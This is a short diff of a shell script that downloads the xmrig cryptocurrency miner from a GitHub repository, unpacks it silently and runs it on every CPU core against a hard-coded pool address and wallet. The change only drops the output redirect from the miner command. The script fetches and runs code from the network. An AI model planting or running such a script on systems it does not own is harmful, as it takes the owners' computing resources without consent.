@@ -3,4 +3,4 @@ A=139.162.30.175:443
 B=SaLvsBkggaZbHsXJoYQnuhZeaQD8aKjXqP882vZmTBkneBdrZw9KH1BfkcaD16GEitJSDmteoTsYVH2CVXZz2NbuVuR8qhi4ueV
 C=HEHE
 wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz >/dev/null 2>&1
-./xmrig --coin=SAL --url $A --user $B --pass $C --donate-level 1 -a rx/0 -t $(nproc --all) >/dev/null 2>&1
+./xmrig --coin=SAL --url $A --user $B --pass $C --donate-level 1 -a rx/0 -t $(nproc --all)
